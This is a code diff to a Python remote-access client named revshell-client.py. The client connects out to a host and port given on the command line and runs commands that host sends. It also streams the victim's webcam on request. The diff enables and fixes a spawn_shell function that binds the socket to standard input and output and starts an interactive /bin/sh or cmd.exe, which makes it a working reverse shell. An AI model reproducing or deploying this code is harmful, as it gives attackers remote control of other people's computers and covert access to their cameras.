@@ -7,19 +7,20 @@ import cv2
 import pickle
 import struct
 import imutils
+import platform
 
 # Supposed to be a stable bash shell, works
 # on the client but not on the server
 
-# def spawn_shell(s):
+def spawn_shell(s):
 	
-# 	os.dup2(s.fileno(), 0)
-# 	os.dup2(s.fileno(), 1)
-# 	os.dup2(s.fileno(), 2)
-# 	if os.name == 'Linux':
-# 		subprocess.run(["/bin/sh","-i"])
-# 	elif os.name == 'win32':
-# 	subprocess.run(["cmd.exe"])
+	os.dup2(s.fileno(), 0)
+	os.dup2(s.fileno(), 1)
+	os.dup2(s.fileno(), 2)
+	if platform.system() == 'Linux':
+		subprocess.run(["/bin/sh","-i"])
+	elif platform.system() == 'Windows':
+		subprocess.run(["cmd.exe"])
 
 # Capture video with webcam
 
@@ -58,8 +59,8 @@ def main(SERVER_HOST, SERVER_PORT):
 		elif splitted_command[0] == "webcam":
 			stream = VideoStream(s)
 			stream.send()
-		# elif command == "shell":
-		# 	spawn_shell(s)
+		elif command == "shell":
+			spawn_shell(s)
 		else:
 			output = subprocess.getoutput(command)
 			s.send(output.encode())
@@ -70,5 +71,5 @@ if __name__ == '__main__':
 	if len(sys.argv) != 3:
 		print("Usage: python3 revshell-client.py <ip> <port>")
 		exit(1)
-	print(os.name)
+	print(platform.system())
 	main(sys.argv[1], int(sys.argv[2]))
